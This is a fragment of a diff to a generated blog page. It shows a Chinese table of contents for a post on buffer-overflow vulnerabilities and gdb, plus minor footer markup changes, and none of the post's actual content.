+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#gdb使用"><span class="nav-number">1.</span> <span class="nav-text">gdb使用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#简介"><span class="nav-number">2.</span> <span class="nav-text">简介</span></a></li></ol><li class="nav-item nav-level-2"><a class="nav-link" href="#什么是缓冲区溢出"><span class="nav-number"></span> <span class="nav-text">什么是缓冲区溢出</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#两种缓冲区溢出"><span class="nav-number"></span> <span class="nav-text">两种缓冲区溢出</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#后果"><span class="nav-number"></span> <span class="nav-text">后果</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#示例"><span class="nav-number">1.</span> <span class="nav-text">示例</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-漏洞示例代码"><span class="nav-number"></span> <span class="nav-text">1.漏洞示例代码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-如何利用"><span class="nav-number"></span> <span class="nav-text">2.如何利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-测试步骤"><span class="nav-number"></span> <span class="nav-text">3.测试步骤</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#小结"><span class="nav-number">1.</span> <span class="nav-text">小结</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Reference"><span class="nav-number">2.</span> <span class="nav-text">Reference</span></a></li></ol></li></div>
             
 
           </div>
@@ -733,7 +729,7 @@
         <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
 </script>
 
-<div class="copyright" >
+<div class="copyright">
   
   &copy; 
   <span itemprop="copyrightYear">2020</span>
